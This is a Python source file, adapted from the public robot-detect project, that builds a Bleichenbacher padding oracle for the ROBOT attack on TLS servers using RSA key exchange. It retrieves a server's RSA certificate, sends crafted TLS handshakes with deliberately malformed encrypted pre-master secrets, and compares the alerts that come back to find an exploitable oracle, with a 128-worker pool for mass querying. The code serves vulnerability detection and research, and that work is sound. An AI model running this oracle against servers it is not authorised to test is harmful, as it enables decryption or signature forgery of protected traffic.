# Code based on https://github.com/robotattackorg/robot-detect/blob/master/robot-detect:
# > Detection and proof of concept for the ROBOT attack
# > https://robotattack.org/
# >
# > This code is licensed as CC0.

import ssl
import socket
from concurrent.futures import ProcessPoolExecutor, as_completed
from cryptography import x509
from cryptography.hazmat.backends import default_backend
from Crypto.Random import get_random_bytes
import gmpy2


# This uses all TLS_RSA ciphers with AES and 3DES
ch_def = bytearray.fromhex("16030100610100005d03034f20d66cba6399e552fd735d75feb0eeae2ea2ebb357c9004e21d0c2574f837a000010009d003d0035009c003c002f000a00ff01000024000d0020001e060106020603050105020503040104020403030103020303020102020203")

# This uses only TLS_RSA_WITH_AES_128_CBC_SHA (0x002f)
ch_cbc = bytearray.fromhex("1603010055010000510303ecce5dab6f55e5ecf9cccd985583e94df5ed652a07b1f5c7d9ba7310770adbcb000004002f00ff01000024000d0020001e060106020603050105020503040104020403030103020303020102020203")

# This uses only TLS-RSA-WITH-AES-128-GCM-SHA256 (0x009c)
ch_gcm = bytearray.fromhex("1603010055010000510303ecce5dab6f55e5ecf9cccd985583e94df5ed652a07b1f5c7d9ba7310770adbcb000004009c00ff01000024000d0020001e060106020603050105020503040104020403030103020303020102020203")

ch = ch_def

ccs = bytearray.fromhex("000101")
enc = bytearray.fromhex("005091a3b6aaa2b64d126e5583b04c113259c4efa48e40a19b8e5f2542c3b1d30f8d80b7582b72f08b21dfcbff09d4b281676a0fb40d48c20c4f388617ff5c00808a96fbfe9bb6cc631101a6ba6b6bc696f0")

MSG_FASTOPEN = 0x20000000
# set to true if you want to generate a signature or if the first ciphertext is not PKCS#1 v1.5 conform
EXECUTE_BLINDING = True

# We only enable TCP fast open if the Linux proc interface exists
enable_fastopen = False # True # os.path.exists("/proc/sys/net/ipv4/tcp_fastopen")
ORACLE_SOCKET_TIMEOUT = 10  # seconds; prevent a stalled TLS peer from hanging a query

def global_recv_n(s, amount):
    data = b""
    while len(data) < amount:
        chunk = s.recv(amount - len(data))
        if not chunk:
            raise ConnectionError("TLS peer closed during record")
        data += chunk
    return data

def global_recv_record(s):
    header = global_recv_n(s, 5)
    data = global_recv_n(s, header[3] * 256 + header[4])
    return header, data

def global__query(pre_master_secret, message_flow, ip, port, client_hello, server_version, client_key_exchange_prefix):
    global ccs, enc, enable_fastopen, MSG_FASTOPEN
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(ORACLE_SOCKET_TIMEOUT)
    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    if not enable_fastopen:
        s.connect((ip, port))

    data = b""
    data += client_hello

    data += b"\x16" + server_version
    data += client_key_exchange_prefix + pre_master_secret

    if not message_flow:
        data += b"\x14" + server_version + ccs
        data += b"\x16" + server_version + enc

    try:
        if enable_fastopen:
            s.sendto(data, MSG_FASTOPEN, (ip, port))
        else:
            s.sendall(data)
        s.shutdown(socket.SHUT_WR)

        # receive responses for client hello (we receive all records until a server hello done = 0x0e is received)
        data = b""
        while len(data) < 1 or data[0] != 0x0e:
            _, data = global_recv_record(s)

        alert = s.recv(4096)

        if len(alert) == 0:
            return "No data received from server"
        if alert[0] == 0x15:
            if len(alert) < 7:
                return "TLS alert was truncated (%s)" % (repr(alert))
            return "TLS alert %i of length %i" % (alert[6], len(alert))
        else:
            return "Received something other than an alert (%s)" % (alert[0:10])
    except ConnectionResetError as e:
        return "ConnectionResetError"
    except socket.timeout:
        return ("Timeout waiting for alert")
    except OSError:
        pass
    finally:
        s.close()
    return ""

def global_query(number, e, N, C, modulus_bits, good, message_flow, ip, port, client_hello, server_version, client_key_exchange_prefix):
    cc = (pow(number, e, N) * C) % N
    tmp = hex(cc).rstrip("L").lstrip("0x").rjust(modulus_bits // 4, '0')
    pms = bytearray.fromhex(tmp)
    return global__query(pms, message_flow, ip, port, client_hello, server_version, client_key_exchange_prefix) == good

class TLSOracle:

    def __init__(self, config, ip, port, client_hello, client_key_exchange_prefix, e, N, C):
        self.config = config
        self.calls = 0
        self.round_trips = 0
        self.ip = ip
        self.port = port
        self.client_hello = client_hello
        self.client_key_exchange_prefix = client_key_exchange_prefix
        self.workers = 128
        self.server_version = self._find_server_version()
        self.modulus_bits = N.bit_length()
        self.message_flow = False
        self.good = None
        self.e = e
        self.N = N
        self.C = C
        if self.server_version is None:
            raise Exception("failed to get TLS version from server!")

        # get fast-open cookie
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(ORACLE_SOCKET_TIMEOUT)
        s.connect((ip, port))
        s.close()
        self.executor = ProcessPoolExecutor(max_workers=self.workers)

    def _find_server_version(self):
        # only get server tls version once
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(ORACLE_SOCKET_TIMEOUT)
        try:
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((self.ip, self.port))
            s.sendall(self.client_hello)
            msg = global_recv_n(s, 11)
            return msg[9:11] # bytes that indicate server version
        finally:
            s.close()

    def _recv_n(self, s, amount):
        return global_recv_n(s, amount)

    def _recv_record(self, s):
        header = self._recv_n(s, 5)
        data = self._recv_n(s, header[3] * 256 + header[4])
        return header, data

    def _query(self, pre_master_secret, message_flow=None):
        global ccs, enc, enable_fastopen, MSG_FASTOPEN
        if message_flow is None:
            message_flow = self.message_flow
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(ORACLE_SOCKET_TIMEOUT)
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        if not enable_fastopen:
            s.connect((self.ip, self.port))

        data = b""
        data += self.client_hello

        data += b"\x16" + self.server_version
        data += self.client_key_exchange_prefix + pre_master_secret

        if not message_flow:
            data += b"\x14" + self.server_version + ccs
            data += b"\x16" + self.server_version + enc

        try:
            if enable_fastopen:
                s.sendto(data, MSG_FASTOPEN, (self.ip, self.port))
            else:
                s.sendall(data)
            s.shutdown(socket.SHUT_WR)
            # receive responses for client hello (we receive all records until a server hello done = 0x0e is received)
            data = b""
            while len(data) < 1 or data[0] != 0x0e:
                _, data = self._recv_record(s)

            alert = s.recv(4096)
            if len(alert) == 0:
                return "No data received from server"
            if alert[0] == 0x15:
                if len(alert) < 7:
                    return "TLS alert was truncated (%s)" % (repr(alert))
                return "TLS alert %i of length %i" % (alert[6], len(alert))
            else:
                return "Received something other than an alert (%s)" % (alert[0:10])
        except ConnectionResetError as e:
            return "ConnectionResetError"
        except socket.timeout:
            return ("Timeout waiting for alert")
        except OSError:
            pass
        finally:
            s.close()
        return ""

    def _count(self):
        self.calls = self.calls + 1
        if self.calls % 1000 == 0:
            print(self.calls, "oracle queries")

    def query_raw(self, pre_master_secret, message_flow=None, count=True):
        if count:
            self._count()
            self.round_trips += 1
        return self._query(pre_master_secret, message_flow=message_flow)

    def query(self, number, batch=False):
        self._count()
        if not batch:
            self.round_trips += 1
        cc = (int(gmpy2.powmod(number, self.e, self.N)) * self.C) % self.N
        tmp = hex(cc).rstrip("L").lstrip("0x").rjust(self.modulus_bits // 4, '0')
        pms = bytearray.fromhex(tmp)
        return self.query_raw(pms, count=False) == self.good


    def submit(self, work):
        self.round_trips += (len(work) + self.workers - 1) // self.workers
        work_queue = list()
        for num in work:
            n, extra = num
            self._count()
            future = self.executor.submit(global_query, n, self.e, self.N, self.C, self.modulus_bits, self.good, self.message_flow, self.ip, self.port, self.client_hello, self.server_version, self.client_key_exchange_prefix)
            future.extra = extra
            work_queue.append(future)
        return work_queue

    def cancel(self, work_queue):
        for work in work_queue:
            work.cancel()

    def as_completed(self, work_queue):
        for fut in as_completed(work_queue):
            if fut.cancelled():
                continue
            yield fut.extra, fut.result()


class RSAPublicKey:
    def __init__(self, N, e):
        self.N = N
        self.e = e
        self.bits = ceil_div(N.bit_length(), 8) * 8
        self.B = 1 << (8 * (self.bits // 8 - 2))


def ceil_div(a, b):
    return -(-a // b)


def make_cke_prefix(rsa):
    modulus_bytes = ceil_div(rsa.N.bit_length(), 8)
    return bytearray.fromhex(
        "{0:0{1}x}".format(modulus_bytes + 6, 4)
        + "10"
        + "{0:0{1}x}".format(modulus_bytes + 2, 6)
        + "{0:0{1}x}".format(modulus_bytes, 4)
    )


def get_rsa_from_server(server, port):
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ctx.set_ciphers("RSA")
        raw_socket = socket.socket()
        raw_socket.settimeout(ORACLE_SOCKET_TIMEOUT)
        s = ctx.wrap_socket(raw_socket)
        s.connect((server, port))
        cert_raw = s.getpeercert(binary_form=True)
        cert_dec = x509.load_der_x509_certificate(cert_raw, default_backend())
        s.close()
        return RSAPublicKey(cert_dec.public_key().public_numbers().n, cert_dec.public_key().public_numbers().e)
    except ssl.SSLError as e:
        print("Cannot connect to server: %s" % e)
        print("Server does not seem to allow connections with TLS_RSA (this is ideal).")
        s.close()
        quit()
    except (ConnectionRefusedError, socket.timeout) as e:
        print("Cannot connect to server: %s" % e)
        print("There seems to be no TLS on this host/port.")
        quit()

def configure_oracle(oracle, rsa, quiet=False, test=False):
    rsa_bytelen = ceil_div(rsa.bits, 8)
    random_bytes_no_zero = b""
    while len(random_bytes_no_zero) < rsa_bytelen:
        b = get_random_bytes(1)
        if b != b"\x00":
            random_bytes_no_zero += b

    pms = random_bytes_no_zero[-46:]

    pms_ok = bytes([0x00, 0x02]) + random_bytes_no_zero[:rsa_bytelen - 46 - 2 - 1 - 2] + b"\x00" + b"\x03\x03" + pms
    pms_ok = int.from_bytes(pms_ok, "big")
    c_ok   = pow(pms_ok, rsa.e, rsa.N).to_bytes(rsa_bytelen, "big")
    r_ok = oracle.query_raw(c_ok, message_flow = False)
    oracle.good = r_ok

    if test:
        pms_no_zero         = bytes([0x00, 0x02]) + random_bytes_no_zero[:rsa_bytelen - 46 - 2 - 1 - 2] + b"\x11" + b"\x03\x03" + pms
        pms_wrong_zero      = bytes([0x00, 0x02]) + random_bytes_no_zero[:rsa_bytelen - 46 - 2 - 1 - 2] + b"\x11" + pms + b"\x00\x11"
        pms_wrong_version   = bytes([0x00, 0x02]) + random_bytes_no_zero[:rsa_bytelen - 46 - 2 - 1 - 2] + b"\x00" + b"\x02\x02" + pms
        pms_wrong_pad       = bytes([0x01, 0x01]) + random_bytes_no_zero[:rsa_bytelen - 46 - 2 - 1 - 2] + b"\x00" + b"\x03\x03" + pms

        pms_no_zero         = int.from_bytes(pms_no_zero, "big")
        pms_wrong_zero      = int.from_bytes(pms_wrong_zero, "big")
        pms_wrong_version   = int.from_bytes(pms_wrong_version, "big")
        pms_wrong_pad       = int.from_bytes(pms_wrong_pad, "big")

        c_no_zero           = pow(pms_no_zero, rsa.e, rsa.N).to_bytes(rsa_bytelen, "big")
        c_wrong_zero        = pow(pms_wrong_zero, rsa.e, rsa.N).to_bytes(rsa_bytelen, "big")
        c_wrong_version     = pow(pms_wrong_version, rsa.e, rsa.N).to_bytes(rsa_bytelen, "big")
        c_wrong_pad         = pow(pms_wrong_pad, rsa.e, rsa.N).to_bytes(rsa_bytelen, "big")

        r_no_zero = oracle.query_raw(c_no_zero, message_flow = False)
        r_wrong_zero = oracle.query_raw(c_wrong_zero, message_flow = False)
        r_wrong_version = oracle.query_raw(c_wrong_version, message_flow = False)
        r_wrong_pad = oracle.query_raw(c_wrong_pad, message_flow = False)

        if not quiet:
            print("Normal message flow:")
            print("Result of good request:                 ", r_ok)
            print("Result of bad request 1 (wrong pad):    ", r_wrong_pad)
            print("Result of bad request 2 (wrong zero):   ", r_wrong_zero)
            print("Result of bad request 3 (no zero):      ", r_no_zero)
            print("Result of bad request 4 (wrong version):", r_wrong_version)

        rm_ok = oracle.query_raw(c_ok, message_flow = True)
        rm_no_zero = oracle.query_raw(c_no_zero, message_flow = True)
        rm_wrong_zero = oracle.query_raw(c_wrong_zero, message_flow = True)
        rm_wrong_version = oracle.query_raw(c_wrong_version, message_flow = True)
        rm_wrong_pad = oracle.query_raw(c_wrong_pad, message_flow = True)

        if not quiet:
            print("Alternative flow:")
            print("Result of good request:                 ", rm_ok)
            print("Result of bad request 1 (wrong pad):    ", rm_wrong_pad)
            print("Result of bad request 2 (wrong zero):   ", rm_wrong_zero)
            print("Result of bad request 3 (no zero):      ", rm_no_zero)
            print("Result of bad request 4 (wrong version):", rm_wrong_version)
        if (r_ok == r_no_zero == r_wrong_zero == r_wrong_version == r_wrong_pad):
            oracle.message_flow = True
            oracle.good = rm_ok
            if (rm_ok == rm_no_zero == rm_wrong_zero == rm_wrong_version == rm_wrong_pad):
                raise Exception("No Bleichenbacher Oracle detected!")
            if not quiet:
                print("Using alternative message flow!")
        else:
            if not quiet:
                print("Using normal message flow!")
